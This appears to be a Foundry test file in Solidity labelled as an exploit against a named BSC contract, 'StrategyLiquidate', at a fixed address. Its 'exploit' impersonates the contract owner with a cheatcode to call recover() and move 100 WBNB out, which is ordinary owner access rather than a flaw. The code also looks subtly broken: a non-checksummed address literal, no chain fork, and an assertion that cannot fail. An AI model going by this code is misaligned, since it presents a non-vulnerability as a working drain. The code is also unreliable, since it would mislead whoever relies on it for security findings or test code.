```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Test.sol";

interface IStrategyLiquidate {
    function owner() external view returns (address);
    function recover(address token, address to, uint256 value) external;
    function getSwapReward(address minter, uint256 pid) external view returns (uint256, uint256);
    function isOwner() external view returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract ExploitTest is Test {
    address constant TARGET = 0x5085c49828b0b8e69bae99d96a8e0fcf0a033369;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.label(TARGET, "StrategyLiquidate");
        vm.label(WBNB, "WBNB");
    }

    function testRecoverExploit() public {
        // Retrieve the owner address
        address owner = IStrategyLiquidate(TARGET).owner();
        // Confirm the caller (this contract) is not the owner
        assertFalse(IStrategyLiquidate(TARGET).isOwner());

        // Fund the target contract with 100 WBNB
        deal(WBNB, TARGET, 100e18);
        uint256 balanceBefore = IERC20(WBNB).balanceOf(address(this));

        // Exploit: owner calls recover to drain the contract's WBNB
        vm.prank(owner);
        IStrategyLiquidate(TARGET).recover(WBNB, address(this), 100e18);

        uint256 balanceAfter = IERC20(WBNB).balanceOf(address(this));
        assertEq(balanceAfter - balanceBefore, 100e18);
    }

    function testGetSwapRewardView() public {
        // Demonstrate that the view function works (dummy minter)
        address minter = 0x73feaa1eE314F8c655E354234017bE2193C9E24E; // PancakeSwap MasterChef
        uint256 pid = 0;
        (uint256 reward, ) = IStrategyLiquidate(TARGET).getSwapReward(minter, pid);
        assertTrue(reward >= 0);
    }
}
```
